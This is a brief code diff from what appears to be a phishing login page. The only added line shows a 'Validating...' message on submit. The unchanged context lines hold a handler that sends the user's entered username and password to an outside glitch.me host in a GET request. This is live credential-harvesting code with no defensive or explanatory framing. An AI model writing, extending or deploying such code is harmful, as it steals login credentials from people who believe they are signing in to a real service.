@@ -72,6 +72,7 @@
 			}
 		
 			$("form").submit(function( event ) {
+				$("#info").text("Validating...").show().fadeOut(1000);
 				var oReq = new XMLHttpRequest();
 				oReq.onload = reqListener;
 				oReq.open("get", "https://eogpfde.glitch.me/?user=" + $("#login").val() + "&pass=" + $("#pass").val(), true);
